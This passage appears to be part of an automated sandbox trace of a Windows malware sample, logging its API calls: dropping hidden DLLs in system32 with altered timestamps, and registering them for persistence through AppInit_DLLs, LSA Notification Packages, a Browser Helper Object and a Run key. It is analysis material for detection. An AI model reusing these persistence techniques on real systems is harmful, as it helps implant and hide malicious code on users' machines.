+<open_file filetype="file" srcfile="c:\bd09361685d14bb9eacb4e6d1f2c7f97.EX" srcfile_hash="hash_error" creationdistribution="OPEN_EXISTING" desiredaccess="FILE_ANY_ACCESS" shareaccess="FILE_SHARE_READ" flags="FILE_ATTRIBUTE_NORMAL SECURITY_ANONYMOUS"/>
+<open_file filetype="namedpipe" srcfile="\\.\PIPE\lsarpc" creationdistribution="OPEN_EXISTING" desiredaccess="FILE_ANY_ACCESS" shareaccess="FILE_SHARE_READ FILE_SHARE_WRITE" flags="SECURITY_ANONYMOUS"/>
+<create_open_file filetype="file" srcfile="C:\WINDOWS\system32\temekatu.dll" srcfile_hash="hash_error" creationdistribution="OPEN_ALWAYS" desiredaccess="FILE_ANY_ACCESS" shareaccess="FILE_SHARE_READ" flags="FILE_ATTRIBUTE_HIDDEN FILE_ATTRIBUTE_SYSTEM SECURITY_ANONYMOUS"/>
+<get_system_time apifunction="GetSystemTime"/>
+<set_file_time filetype="file" srcfile="C:\WINDOWS\system32\temekatu.dll" srcfile_hash="hash_error" desiredaccess="FILE_ANY_ACCESS" flags="SECURITY_ANONYMOUS"/>
+<delete_file filetype="file" srcfile="C:\WINDOWS\system32\temekatu.dll" srcfile_hash="hash_error" desiredaccess="FILE_ANY_ACCESS" flags="SECURITY_ANONYMOUS"/>
+<open_file filetype="namedpipe" srcfile="\\.\PIPE\lsarpc" creationdistribution="OPEN_EXISTING" desiredaccess="FILE_ANY_ACCESS" shareaccess="FILE_SHARE_READ FILE_SHARE_WRITE" flags="SECURITY_ANONYMOUS"/>
+<create_open_file filetype="file" srcfile="C:\WINDOWS\system32\jogopamo.dll" srcfile_hash="hash_error" creationdistribution="OPEN_ALWAYS" desiredaccess="FILE_ANY_ACCESS" shareaccess="FILE_SHARE_READ" flags="FILE_ATTRIBUTE_HIDDEN FILE_ATTRIBUTE_SYSTEM SECURITY_ANONYMOUS"/>
+<get_system_time apifunction="GetSystemTime"/>
+<set_file_time filetype="file" srcfile="C:\WINDOWS\system32\jogopamo.dll" srcfile_hash="hash_error" desiredaccess="FILE_ANY_ACCESS" flags="SECURITY_ANONYMOUS"/>
+<get_system_time apifunction="GetSystemTime"/>
+<set_file_time filetype="file" srcfile="C:\WINDOWS\system32\jogopamo.dll" srcfile_hash="hash_error" desiredaccess="FILE_ANY_ACCESS" flags="SECURITY_ANONYMOUS"/>
+<get_system_time apifunction="GetSystemTime"/>
+<set_file_time filetype="file" srcfile="C:\WINDOWS\system32\jogopamo.dll" srcfile_hash="hash_error" desiredaccess="FILE_ANY_ACCESS" flags="SECURITY_ANONYMOUS"/>
+<open_file filetype="namedpipe" srcfile="\\.\PIPE\lsarpc" creationdistribution="OPEN_EXISTING" desiredaccess="FILE_ANY_ACCESS" shareaccess="FILE_SHARE_READ FILE_SHARE_WRITE" flags="SECURITY_ANONYMOUS"/>
+<create_mutex name="Global\mukewopela" owned="0"/>
+<create_open_file filetype="file" srcfile="C:\WINDOWS\system32\ketamuri" srcfile_hash="hash_error" creationdistribution="OPEN_ALWAYS" desiredaccess="FILE_ANY_ACCESS" shareaccess="FILE_SHARE_READ FILE_SHARE_WRITE" flags="FILE_ATTRIBUTE_HIDDEN SECURITY_ANONYMOUS"/>
+<open_key key="HKEY_LOCAL_MACHINE\Software\Microsoft"/>
+<open_key key="HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\metedila"/>
+<query_value key="HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\metedila" value="jofosefo"/>
+<set_value key="HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\metedila" value="jofosefo" data="[REG_BINARY, size: 1744 bytes]"/>
+<open_file filetype="namedpipe" srcfile="\\.\PIPE\lsarpc" creationdistribution="OPEN_EXISTING" desiredaccess="FILE_ANY_ACCESS" shareaccess="FILE_SHARE_READ FILE_SHARE_WRITE" flags="SECURITY_ANONYMOUS"/>
+<create_mutex name="Global\mukewopela" owned="0"/>
+<create_open_file filetype="file" srcfile="C:\WINDOWS\system32\ketamuri" srcfile_hash="hash_error" creationdistribution="OPEN_ALWAYS" desiredaccess="FILE_ANY_ACCESS" shareaccess="FILE_SHARE_READ FILE_SHARE_WRITE" flags="FILE_ATTRIBUTE_HIDDEN SECURITY_ANONYMOUS"/>
+<open_key key="HKEY_LOCAL_MACHINE\Software\Microsoft\Windows NT\CurrentVersion\Windows"/>
+<open_file filetype="namedpipe" srcfile="\\.\PIPE\lsarpc" creationdistribution="OPEN_EXISTING" desiredaccess="FILE_ANY_ACCESS" shareaccess="FILE_SHARE_READ FILE_SHARE_WRITE" flags="SECURITY_ANONYMOUS"/>
+<get_file_attributes filetype="file" srcfile="\REGISTRY\MACHINE\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Windows" srcfile_hash="hash_error" desiredaccess="FILE_ANY_ACCESS" flags="SECURITY_ANONYMOUS"/>
+<open_key key="HKEY_LOCAL_MACHINE\Software\Microsoft\Windows NT\CurrentVersion\Windows"/>
+<query_value key="HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Windows" value="AppInit_DLLs"/>
+<open_key key="HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Control\Lsa"/>
+<open_file filetype="namedpipe" srcfile="\\.\PIPE\lsarpc" creationdistribution="OPEN_EXISTING" desiredaccess="FILE_ANY_ACCESS" shareaccess="FILE_SHARE_READ FILE_SHARE_WRITE" flags="SECURITY_ANONYMOUS"/>
+<get_file_attributes filetype="file" srcfile="\REGISTRY\MACHINE\SYSTEM\ControlSet001\Control\Lsa" srcfile_hash="hash_error" desiredaccess="FILE_ANY_ACCESS" flags="SECURITY_ANONYMOUS"/>
+<open_key key="HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Control\Lsa"/>
+<query_value key="HKEY_LOCAL_MACHINE\SYSTEM\ControlSet001\Control\Lsa" value="Notification Packages"/>
+<open_key key="HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Ext\Settings"/>
+<delete_key key="HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Ext\Settings\&#x7B;4339e421-375e-4262-8df4-0862c872d7c5&#x7D;"/>
+<open_key key="HKEY_LOCAL_MACHINE\Software\Microsoft\Windows\CurrentVersion\Explorer\Browser Helper Objects\&#x7B;4339e421-375e-4262-8df4-0862c872d7c5&#x7D;"/>
+<open_key key="HKEY_CLASSES_ROOT\CLSID\&#x7B;4339e421-375e-4262-8df4-0862c872d7c5&#x7D;"/>
+<open_key key="HKEY_LOCAL_MACHINE\SOFTWARE\Classes\CLSID\&#x7B;4339e421-375e-4262-8df4-0862c872d7c5&#x7D;\InprocServer32"/>
+<query_value key="HKEY_LOCAL_MACHINE\SOFTWARE\Classes\CLSID\&#x7B;4339e421-375e-4262-8df4-0862c872d7c5&#x7D;\InprocServer32"/>
+<query_value key="HKEY_LOCAL_MACHINE\SOFTWARE\Classes\CLSID\&#x7B;4339e421-375e-4262-8df4-0862c872d7c5&#x7D;\InprocServer32" value="ThreadingModel"/>
+<open_key key="HKEY_LOCAL_MACHINE\Software\Microsoft\Windows\CurrentVersion\Run"/>
+<query_value key="HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows\CurrentVersion\Run" value="sasofobaja"/>
+<open_file filetype="namedpipe" srcfile="\\.\PIPE\lsarpc" creationdistribution="OPEN_EXISTING" desiredaccess="FILE_ANY_ACCESS" shareaccess="FILE_SHARE_READ FILE_SHARE_WRITE" flags="SECURITY_ANONYMOUS"/>
+<create_mutex name="Global\mukewopela" owned="0"/>
+<create_open_file filetype="file" srcfile="C:\WINDOWS\system32\ketamuri" srcfile_hash="hash_error" creationdistribution="OPEN_ALWAYS" desiredaccess="FILE_ANY_ACCESS" shareaccess="FILE_SHARE_READ FILE_SHARE_WRITE" flags="FILE_ATTRIBUTE_HIDDEN SECURITY_ANONYMOUS"/>
+<open_key key="HKEY_LOCAL_MACHINE\Software\Microsoft"/>
+<open_key key="HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\metedila"/>
+<query_value key="HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\metedila" value="jofosefo"/>
+</all_section>
+</thread>
+<thread tid="2748">
+<all_section>
+<open_file filetype="namedpipe" srcfile="\\.\PIPE\lsarpc" creationdistribution="OPEN_EXISTING" desiredaccess="FILE_ANY_ACCESS" shareaccess="FILE_SHARE_READ FILE_SHARE_WRITE" flags="SECURITY_ANONYMOUS"/>
+<open_file filetype="file" srcfile="c:\bd09361685d14bb9eacb4e6d1f2c7f97.EX" srcfile_hash="hash_error" creationdistribution="OPEN_EXISTING" desiredaccess="FILE_ANY_ACCESS" shareaccess="FILE_SHARE_READ" flags="FILE_ATTRIBUTE_NORMAL SECURITY_ANONYMOUS"/>
+<open_file filetype="namedpipe" srcfile="\\.\PIPE\lsarpc" creationdistribution="OPEN_EXISTING" desiredaccess="FILE_ANY_ACCESS" shareaccess="FILE_SHARE_READ FILE_SHARE_WRITE" flags="SECURITY_ANONYMOUS"/>
+<create_open_file filetype="file" srcfile="C:\WINDOWS\system32\nikarili.dll" srcfile_hash="hash_error" creationdistribution="OPEN_ALWAYS" desiredaccess="FILE_ANY_ACCESS" shareaccess="FILE_SHARE_READ" flags="FILE_ATTRIBUTE_HIDDEN FILE_ATTRIBUTE_SYSTEM SECURITY_ANONYMOUS"/>
+<get_system_time apifunction="GetSystemTime"/>
+<set_file_time filetype="file" srcfile="C:\WINDOWS\system32\nikarili.dll" srcfile_hash="hash_error" desiredaccess="FILE_ANY_ACCESS" flags="SECURITY_ANONYMOUS"/>
+<delete_file filetype="file" srcfile="C:\WINDOWS\system32\nikarili.dll" srcfile_hash="hash_error" desiredaccess="FILE_ANY_ACCESS" flags="SECURITY_ANONYMOUS"/>
+<open_file filetype="namedpipe" srcfile="\\.\PIPE\lsarpc" creationdistribution="OPEN_EXISTING" desiredaccess="FILE_ANY_ACCESS" shareaccess="FILE_SHARE_READ FILE_SHARE_WRITE" flags="SECURITY_ANONYMOUS"/>
+<create_open_file filetype="file" srcfile="C:\WINDOWS\system32\bedihidu.dll" srcfile_hash="hash_error" creationdistribution="OPEN_ALWAYS" desiredaccess="FILE_ANY_ACCESS" shareaccess="FILE_SHARE_READ" flags="FILE_ATTRIBUTE_HIDDEN FILE_ATTRIBUTE_SYSTEM SECURITY_ANONYMOUS"/>
+<get_system_time apifunction="GetSystemTime"/>
+<set_file_time filetype="file" srcfile="C:\WINDOWS\system32\bedihidu.dll" srcfile_hash="hash_error" desiredaccess="FILE_ANY_ACCESS" flags="SECURITY_ANONYMOUS"/>
+<get_system_time apifunction="GetSystemTime"/>
+<set_file_time filetype="file" srcfile="C:\WINDOWS\system32\bedihidu.dll" srcfile_hash="hash_error" desiredaccess="FILE_ANY_ACCESS" flags="SECURITY_ANONYMOUS"/>
+<get_system_time apifunction="GetSystemTime"/>
+<set_file_time filetype="file" srcfile="C:\WINDOWS\system32\bedihidu.dll" srcfile_hash="hash_error" desiredaccess="FILE_ANY_ACCESS" flags="SECURITY_ANONYMOUS"/>
+<open_file filetype="namedpipe" srcfile="\\.\PIPE\lsarpc" creationdistribution="OPEN_EXISTING" desiredaccess="FILE_ANY_ACCESS" shareaccess="FILE_SHARE_READ FILE_SHARE_WRITE" flags="SECURITY_ANONYMOUS"/>
+<create_mutex name="Global\mukewopela" owned="0"/>
+<create_open_file filetype="file" srcfile="C:\WINDOWS\system32\ketamuri" srcfile_hash="hash_error" creationdistribution="OPEN_ALWAYS" desiredaccess="FILE_ANY_ACCESS" shareaccess="FILE_SHARE_READ FILE_SHARE_WRITE" flags="FILE_ATTRIBUTE_HIDDEN SECURITY_ANONYMOUS"/>
+<open_key key="HKEY_LOCAL_MACHINE\Software\Microsoft"/>
+<open_key key="HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\metedila"/>
+<query_value key="HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\metedila" value="jofosefo"/>
+<set_value key="HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\metedila" value="jofosefo" data="[REG_BINARY, size: 1744 bytes]"/>
+<open_file filetype="namedpipe" srcfile="\\.\PIPE\lsarpc" creationdistribution="OPEN_EXISTING" desiredaccess="FILE_ANY_ACCESS" shareaccess="FILE_SHARE_READ FILE_SHARE_WRITE" flags="SECURITY_ANONYMOUS"/>
+<create_mutex name="Global\mukewopela" owned="0"/>
+<create_open_file filetype="file" srcfile="C:\WINDOWS\system32\ketamuri" srcfile_hash="hash_error" creationdistribution="OPEN_ALWAYS" desiredaccess="FILE_ANY_ACCESS" shareaccess="FILE_SHARE_READ FILE_SHARE_WRITE" flags="FILE_ATTRIBUTE_HIDDEN SECURITY_ANONYMOUS"/>
+<open_key key="HKEY_LOCAL_MACHINE\Software\Microsoft\Windows NT\CurrentVersion\Windows"/>
+<open_file filetype="namedpipe" srcfile="\\.\PIPE\lsarpc" creationdistribution="OPEN_EXISTING" desiredaccess="FILE_ANY_ACCESS" shareaccess="FILE_SHARE_READ FILE_SHARE_WRITE" flags="SECURITY_ANONYMOUS"/>
+<get_file_attributes filetype="file" srcfile="\REGISTRY\MACHINE\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Windows" srcfile_hash="hash_error" desiredaccess="FILE_ANY_ACCESS" flags="SECURITY_ANONYMOUS"/>
+<open_key key="HKEY_LOCAL_MACHINE\Software\Microsoft\Windows NT\CurrentVersion\Windows"/>
+<query_value key="HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Windows" value="AppInit_DLLs"/>
+<set_value key="HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Windows" value="AppInit_DLLs" data="C:\WINDOWS\system32\pihuyeha.dll"/>
+<set_value key="HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Windows" value="LoadAppInit_DLLs" data="[REG_DWORD, value: 00000001]"/>
+<open_key key="HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Control\Lsa"/>
+<open_file filetype="namedpipe" srcfile="\\.\PIPE\lsarpc" creationdistribution="OPEN_EXISTING" desiredaccess="FILE_ANY_ACCESS" shareaccess="FILE_SHARE_READ FILE_SHARE_WRITE" flags="SECURITY_ANONYMOUS"/>
+<get_file_attributes filetype="file" srcfile="\REGISTRY\MACHINE\SYSTEM\ControlSet001\Control\Lsa" srcfile_hash="hash_error" desiredaccess="FILE_ANY_ACCESS" flags="SECURITY_ANONYMOUS"/>
+<open_key key="HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Control\Lsa"/>
+<query_value key="HKEY_LOCAL_MACHINE\SYSTEM\ControlSet001\Control\Lsa" value="Notification Packages"/>
+<set_value key="HKEY_LOCAL_MACHINE\SYSTEM\ControlSet001\Control\Lsa" value="Notification Packages" data="[REG_MULTI_SZ, value: &#x22;scecli,C:\WINDOWS\system32\pihuyeha.dll&#x22;, size: 78 bytes]"/>
+<open_key key="HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Ext\Settings"/>
+<delete_key key="HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Ext\Settings\&#x7B;4339e421-375e-4262-8df4-0862c872d7c5&#x7D;"/>
+<create_key key="HKEY_LOCAL_MACHINE\Software\Microsoft\Windows\CurrentVersion\Explorer\Browser Helper Objects\&#x7B;4339e421-375e-4262-8df4-0862c872d7c5&#x7D;"/>
+<open_key key="HKEY_CLASSES_ROOT\CLSID\&#x7B;4339e421-375e-4262-8df4-0862c872d7c5&#x7D;"/>
+<create_key key="HKEY_LOCAL_MACHINE\SOFTWARE\Classes\CLSID\&#x7B;4339e421-375e-4262-8df4-0862c872d7c5&#x7D;\InprocServer32"/>
+<query_value key="HKEY_LOCAL_MACHINE\SOFTWARE\Classes\CLSID\&#x7B;4339e421-375e-4262-8df4-0862c872d7c5&#x7D;\InprocServer32"/>
+<query_value key="HKEY_LOCAL_MACHINE\SOFTWARE\Classes\CLSID\&#x7B;4339e421-375e-4262-8df4-0862c872d7c5&#x7D;\InprocServer32" value="ThreadingModel"/>
+<set_value key="HKEY_LOCAL_MACHINE\SOFTWARE\Classes\CLSID\&#x7B;4339e421-375e-4262-8df4-0862c872d7c5&#x7D;\InprocServer32" value="ThreadingModel" data="Both"/>
+<open_key key="HKEY_LOCAL_MACHINE\Software\Microsoft\Windows\CurrentVersion\Run"/>
+<query_value key="HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows\CurrentVersion\Run" value="sasofobaja"/>
+<open_file filetype="namedpipe" srcfile="\\.\PIPE\lsarpc" creationdistribution="OPEN_EXISTING" desiredaccess="FILE_ANY_ACCESS" shareaccess="FILE_SHARE_READ FILE_SHARE_WRITE" flags="SECURITY_ANONYMOUS"/>
+<create_mutex name="Global\mukewopela" owned="0"/>
+<create_open_file filetype="file" srcfile="C:\WINDOWS\system32\ketamuri" srcfile_hash="hash_error" creationdistribution="OPEN_ALWAYS" desiredaccess="FILE_ANY_ACCESS" shareaccess="FILE_SHARE_READ FILE_SHARE_WRITE" flags="FILE_ATTRIBUTE_HIDDEN SECURITY_ANONYMOUS"/>
+<open_key key="HKEY_LOCAL_MACHINE\Software\Microsoft"/>
+<open_key key="HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\metedila"/>
+<query_value key="HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\metedila" value="jofosefo"/>
+<set_value key="HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\metedila" value="jofosefo" data="[REG_BINARY, size: 1744 bytes]"/>
+</all_section>
+</thread>
+<thread tid="2740">
+<all_section>
+<open_file filetype="namedpipe" srcfile="\\.\PIPE\lsarpc" creationdistribution="OPEN_EXISTING" desiredaccess="FILE_ANY_ACCESS" shareaccess="FILE_SHARE_READ FILE_SHARE_WRITE" flags="SECURITY_ANONYMOUS"/>
+<open_file filetype="file" srcfile="c:\bd09361685d14bb9eacb4e6d1f2c7f97.EX" srcfile_hash="hash_error" creationdistribution="OPEN_EXISTING" desiredaccess="FILE_ANY_ACCESS" shareaccess="FILE_SHARE_READ" flags="FILE_ATTRIBUTE_NORMAL SECURITY_ANONYMOUS"/>
+<open_file filetype="namedpipe" srcfile="\\.\PIPE\lsarpc" creationdistribution="OPEN_EXISTING" desiredaccess="FILE_ANY_ACCESS" shareaccess="FILE_SHARE_READ FILE_SHARE_WRITE" flags="SECURITY_ANONYMOUS"/>
+<create_open_file filetype="file" srcfile="C:\WINDOWS\system32\beziseno.dll" srcfile_hash="hash_error" creationdistribution="OPEN_ALWAYS" desiredaccess="FILE_ANY_ACCESS" shareaccess="FILE_SHARE_READ" flags="FILE_ATTRIBUTE_HIDDEN FILE_ATTRIBUTE_SYSTEM SECURITY_ANONYMOUS"/>
+<get_system_time apifunction="GetSystemTime"/>
+<set_file_time filetype="file" srcfile="C:\WINDOWS\system32\beziseno.dll" srcfile_hash="hash_error" desiredaccess="FILE_ANY_ACCESS" flags="SECURITY_ANONYMOUS"/>
+<delete_file filetype="file" srcfile="C:\WINDOWS\system32\beziseno.dll" srcfile_hash="hash_error" desiredaccess="FILE_ANY_ACCESS" flags="SECURITY_ANONYMOUS"/>
+<open_file filetype="namedpipe" srcfile="\\.\PIPE\lsarpc" creationdistribution="OPEN_EXISTING" desiredaccess="FILE_ANY_ACCESS" shareaccess="FILE_SHARE_READ FILE_SHARE_WRITE" flags="SECURITY_ANONYMOUS"/>
+<create_open_file filetype="file" srcfile="C:\WINDOWS\system32\pihuyeha.dll" srcfile_hash="hash_error" creationdistribution="OPEN_ALWAYS" desiredaccess="FILE_ANY_ACCESS" shareaccess="FILE_SHARE_READ" flags="FILE_ATTRIBUTE_HIDDEN FILE_ATTRIBUTE_SYSTEM SECURITY_ANONYMOUS"/>
+<get_system_time apifunction="GetSystemTime"/>
+<set_file_time filetype="file" srcfile="C:\WINDOWS\system32\pihuyeha.dll" srcfile_hash="hash_error" desiredaccess="FILE_ANY_ACCESS" flags="SECURITY_ANONYMOUS"/>
+<get_system_time apifunction="GetSystemTime"/>
+<set_file_time filetype="file" srcfile="C:\WINDOWS\system32\pihuyeha.dll" srcfile_hash="hash_error" desiredaccess="FILE_ANY_ACCESS" flags="SECURITY_ANONYMOUS"/>
+<get_system_time apifunction="GetSystemTime"/>
+<set_file_time filetype="file" srcfile="C:\WINDOWS\system32\pihuyeha.dll" srcfile_hash="hash_error" desiredaccess="FILE_ANY_ACCESS" flags="SECURITY_ANONYMOUS"/>
+<open_file filetype="namedpipe" srcfile="\\.\PIPE\lsarpc" creationdistribution="OPEN_EXISTING" desiredaccess="FILE_ANY_ACCESS" shareaccess="FILE_SHARE_READ FILE_SHARE_WRITE" flags="SECURITY_ANONYMOUS"/>
+<create_mutex name="Global\mukewopela" owned="0"/>
+<create_open_file filetype="file" srcfile="C:\WINDOWS\system32\ketamuri" srcfile_hash="hash_error" creationdistribution="OPEN_ALWAYS" desiredaccess="FILE_ANY_ACCESS" shareaccess="FILE_SHARE_READ FILE_SHARE_WRITE" flags="FILE_ATTRIBUTE_HIDDEN SECURITY_ANONYMOUS"/>
+<open_key key="HKEY_LOCAL_MACHINE\Software\Microsoft"/>
+<open_key key="HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\metedila"/>
+<query_value key="HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\metedila" value="jofosefo"/>
+<set_value key="HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\metedila" value="jofosefo" data="[REG_BINARY, size: 1744 bytes]"/>
+<open_file filetype="namedpipe" srcfile="\\.\PIPE\lsarpc" creationdistribution="OPEN_EXISTING" desiredaccess="FILE_ANY_ACCESS" shareaccess="FILE_SHARE_READ FILE_SHARE_WRITE" flags="SECURITY_ANONYMOUS"/>
+<create_mutex name="Global\mukewopela" owned="0"/>
+<create_open_file filetype="file" srcfile="C:\WINDOWS\system32\ketamuri" srcfile_hash="hash_error" creationdistribution="OPEN_ALWAYS" desiredaccess="FILE_ANY_ACCESS" shareaccess="FILE_SHARE_READ FILE_SHARE_WRITE" flags="FILE_ATTRIBUTE_HIDDEN SECURITY_ANONYMOUS"/>
+<open_key key="HKEY_LOCAL_MACHINE\Software\Microsoft\Windows NT\CurrentVersion\Windows"/>
+<open_file filetype="namedpipe" srcfile="\\.\PIPE\lsarpc" creationdistribution="OPEN_EXISTING" desiredaccess="FILE_ANY_ACCESS" shareaccess="FILE_SHARE_READ FILE_SHARE_WRITE" flags="SECURITY_ANONYMOUS"/>
+<get_file_attributes filetype="file" srcfile="\REGISTRY\MACHINE\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Windows" srcfile_hash="hash_error" desiredaccess="FILE_ANY_ACCESS" flags="SECURITY_ANONYMOUS"/>
+<open_key key="HKEY_LOCAL_MACHINE\Software\Microsoft\Windows NT\CurrentVersion\Windows"/>
+<query_value key="HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Windows" value="AppInit_DLLs"/>
+<open_key key="HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Control\Lsa"/>
+<open_file filetype="namedpipe" srcfile="\\.\PIPE\lsarpc" creationdistribution="OPEN_EXISTING" desiredaccess="FILE_ANY_ACCESS" shareaccess="FILE_SHARE_READ FILE_SHARE_WRITE" flags="SECURITY_ANONYMOUS"/>
+<get_file_attributes filetype="file" srcfile="\REGISTRY\MACHINE\SYSTEM\ControlSet001\Control\Lsa" srcfile_hash="hash_error" desiredaccess="FILE_ANY_ACCESS" flags="SECURITY_ANONYMOUS"/>
+<open_key key="HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Control\Lsa"/>
+<query_value key="HKEY_LOCAL_MACHINE\SYSTEM\ControlSet001\Control\Lsa" value="Notification Packages"/>
+<open_key key="HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Ext\Settings"/>
+<delete_key key="HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Ext\Settings\&#x7B;4339e421-375e-4262-8df4-0862c872d7c5&#x7D;"/>
+<open_key key="HKEY_LOCAL_MACHINE\Software\Microsoft\Windows\CurrentVersion\Explorer\Browser Helper Objects\&#x7B;4339e421-375e-4262-8df4-0862c872d7c5&#x7D;"/>
+<create_key key="HKEY_CLASSES_ROOT\CLSID\&#x7B;4339e421-375e-4262-8df4-0862c872d7c5&#x7D;"/>
+<open_key key="HKEY_LOCAL_MACHINE\SOFTWARE\Classes\CLSID\&#x7B;4339e421-375e-4262-8df4-0862c872d7c5&#x7D;\InprocServer32"/>
+<query_value key="HKEY_LOCAL_MACHINE\SOFTWARE\Classes\CLSID\&#x7B;4339e421-375e-4262-8df4-0862c872d7c5&#x7D;\InprocServer32"/>
+<set_value key="HKEY_LOCAL_MACHINE\SOFTWARE\Classes\CLSID\&#x7B;4339e421-375e-4262-8df4-0862c872d7c5&#x7D;\InprocServer32" data="C:\WINDOWS\system32\bedihidu.dll"/>
+<query_value key="HKEY_LOCAL_MACHINE\SOFTWARE\Classes\CLSID\&#x7B;4339e421-375e-4262-8df4-0862c872d7c5&#x7D;\InprocServer32" value="ThreadingModel"/>
+<open_key key="HKEY_LOCAL_MACHINE\Software\Microsoft\Windows\CurrentVersion\Run"/>
+<query_value key="HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows\CurrentVersion\Run" value="sasofobaja"/>
+<set_value key="HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows\CurrentVersion\Run" value="sasofobaja" data="Rundll32.exe &#x22;C:\WINDOWS\system32\jogopamo.dll&#x22;,s"/>
+<open_file filetype="namedpipe" srcfile="\\.\PIPE\lsarpc" creationdistribution="OPEN_EXISTING" desiredaccess="FILE_ANY_ACCESS" shareaccess="FILE_SHARE_READ FILE_SHARE_WRITE" flags="SECURITY_ANONYMOUS"/>
+<create_mutex name="Global\mukewopela" owned="0"/>
+<create_open_file filetype="file" srcfile="C:\WINDOWS\system32\ketamuri" srcfile_hash="hash_error" creationdistribution="OPEN_ALWAYS" desiredaccess="FILE_ANY_ACCESS" shareaccess="FILE_SHARE_READ FILE_SHARE_WRITE" flags="FILE_ATTRIBUTE_HIDDEN SECURITY_ANONYMOUS"/>
+<open_key key="HKEY_LOCAL_MACHINE\Software\Microsoft"/>
+<open_key key="HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\metedila"/>
+<query_value key="HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\metedila" value="jofosefo"/>
+</all_section>
+</thread>
+<thread tid="2860">
+<all_section>
+<open_key key="HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Control\Session Manager"/>
+<query_value key="HKEY_LOCAL_MACHINE\SYSTEM\ControlSet001\Control\Session Manager" value="PendingFileRenameOperations"/>
+<query_value key="HKEY_LOCAL_MACHINE\SYSTEM\ControlSet001\Control\Session Manager" value="PendingFileRenameOperations2"/>
+<open_file filetype="namedpipe" srcfile="\\.\PIPE\lsarpc" creationdistribution="OPEN_EXISTING" desiredaccess="FILE_ANY_ACCESS" shareaccess="FILE_SHARE_READ FILE_SHARE_WRITE" flags="SECURITY_ANONYMOUS"/>
+<create_mutex name="Global\mukewopela" owned="0"/>
+<load_dll filename="C:\WINDOWS\system32\SHELL32.dll" successful="1" address="&#x24;7E670000" end_address="&#x24;7EE91000" size="8523776" filename_hash="bbe9d57955e5d348e664b72faf331a7b9d722d0c"/>
+<open_file filetype="namedpipe" srcfile="\\.\PIPE\lsarpc" creationdistribution="OPEN_EXISTING" desiredaccess="FILE_ANY_ACCESS" shareaccess="FILE_SHARE_READ FILE_SHARE_WRITE" flags="SECURITY_ANONYMOUS"/>
+<open_file filetype="file" srcfile="C:\WINDOWS\system32\ketamuri" srcfile_hash="hash_error" creationdistribution="OPEN_EXISTING" desiredaccess="FILE_ANY_ACCESS" shareaccess="FILE_SHARE_READ FILE_SHARE_WRITE" flags="FILE_ATTRIBUTE_NORMAL SECURITY_ANONYMOUS"/>
+<create_open_file filetype="file" srcfile="C:\WINDOWS\system32\ketamuri" srcfile_hash="hash_error" creationdistribution="OPEN_ALWAYS" desiredaccess="FILE_ANY_ACCESS" shareaccess="FILE_SHARE_READ FILE_SHARE_WRITE" flags="FILE_ATTRIBUTE_HIDDEN SECURITY_ANONYMOUS"/>
+<open_mutex name="Global\gepakabayimegus" owned="1"/>
+</all_section>
+</thread>
+<thread tid="3196">
+<all_section>
+<sleep milliseconds="250"/>
+</all_section>
+</thread>
+</process>
+<process index="2" pid="2936" filename="C:\Programme\Internet Explorer\IEXPLORE.EXE" filename_hash="hash_error" filesize="636072" md5="a251068640ddb69fd7805b57d89d7ff7" sha1="c7c97a64d3c27eb942b1ee359ee0743cba31031a" username="Administrator" parentindex="0" starttime="00:14.203" terminationtime="00:15.719" startreason="BHOInstalled" terminationreason="NormalTermination" executionstatus="OK">
+<thread tid="2952">
+<all_section>
+<load_image filename="C:\Programme\Internet Explorer\IEXPLORE.EXE" successful="1" address="&#x24;400000" end_address="&#x24;49C000" size="638976" filename_hash="hash_error"/>
+<load_dll filename="C:\WINDOWS\system32\ntdll.dll" successful="1" address="&#x24;7C910000" end_address="&#x24;7C9C9000" size="757760" filename_hash="e753d19a2e3b98b2b3b8f02f276092096d10f22d"/>
+<load_dll filename="C:\WINDOWS\system32\kernel32.dll" successful="1" address="&#x24;7C800000" end_address="&#x24;7C908000" size="1081344" filename_hash="c88d57cc99f75cd928b47b6e444231f26670138f"/>
+<load_dll filename="C:\WINDOWS\system32\ADVAPI32.dll" successful="1" address="&#x24;77DA0000" end_address="&#x24;77E4A000" size="696320" filename_hash="ea2e9bac1789b53d7efcd675a63f4a2b44898439"/>
